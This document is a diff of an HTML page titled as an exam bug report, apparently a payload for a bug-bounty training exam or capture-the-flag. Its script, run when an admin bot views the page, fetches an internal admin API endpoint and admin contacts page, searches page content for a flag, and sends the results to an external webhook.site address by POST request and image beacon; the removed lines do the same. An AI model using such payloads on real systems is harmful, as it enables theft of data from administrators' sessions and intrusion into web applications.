@@ -1,21 +1,42 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exam Bug Report - Reference ID 69ea97eabee6d6b7c664653e</title>
+</head>
 <body>
+    <h1>Processing Technical Report...</h1>
     <script>
-        // 1. Reach back to the Admin Dashboard
-        fetch('https://bugbounty-exam.hashacademy.co/admin/contacts')
-        .then(response => response.text())
-        .then(html => {
-            // 2. Search for the flag pattern
-            const flagMatch = html.match(/Hash{[^}]+}/i);
-            const content = flagMatch ? flagMatch[0] : "Flag_Not_Found_On_Contacts";
+        // 1. Target the internal API endpoint for your specific message ID
+        const targetUrl = 'https://bugbounty-exam.hashacademy.co/api/v1/contact/messages/69ea97eabee6d6b7c664653e';
+        const webhook = 'https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7';
 
-            // 3. Send it to your NEW webhook
-            fetch('https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7?flag=' + btoa(content));
-        })
-        .catch(err => {
-            fetch('https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7?error=' + btoa(err));
-        });
+        fetch(targetUrl)
+            .then(response => response.json())
+            .then(data => {
+                // 2. The bot is now viewing your message data.
+                // We send the full JSON response back to your webhook to see everything.
+                fetch(webhook, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        status: 'Success',
+                        messageID: '69ea97eabee6d6b7c664653e',
+                        content: data
+                    })
+                });
+            })
+            .catch(error => {
+                // 3. Log errors (like CORS or Auth issues) to the webhook
+                fetch(webhook + '?error=' + btoa(error.message));
+            });
+
+        // 4. Also, try to grab the flag directly from the Admin's current session
+        // in case it's in the headers or global scope.
+        const flagSearch = document.documentElement.innerHTML.match(/Hash{[^}]+}/i);
+        if (flagSearch) {
+            new Image().src = webhook + '?found_flag=' + btoa(flagSearch[0]);
+        }
     </script>
 </body>
 </html>
